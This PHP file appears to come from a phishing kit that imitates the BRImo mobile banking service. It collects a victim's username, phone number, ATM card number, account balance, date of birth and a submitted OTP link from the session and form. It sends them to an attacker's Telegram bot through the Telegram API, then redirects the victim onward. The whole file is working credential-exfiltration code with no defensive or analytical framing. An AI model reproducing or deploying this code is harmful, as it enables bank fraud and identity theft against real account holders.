<?php
include "../telegram.php";
session_start();

$username = $_SESSION['username'];
$nohp = $_SESSION['nohp'];
$noatm = $_SESSION['noatm'];
$saldo = $_SESSION['saldo'];
$ttl = $_SESSION['ttl'];

$link = $_POST['link'];

$message = "
( BRImo | Link OTP | ".$username." )

- Username : ".$username."
- No HP : ".$nohp."
- No ATM : ".$noatm."
- Saldo : ".$saldo."
- TTL : ".$ttl."
- Link : ".$link."
 ";
function sendMessage($id_telegram, $message, $id_botTele) {
    $url = "https://api.telegram.org/bot" . $id_botTele . "/sendMessage?parse_mode=markdown&chat_id=" . $id_telegram;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true);
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($id_telegram, $message, $id_botTele);
header('Location: ../linkgal.php');
?>
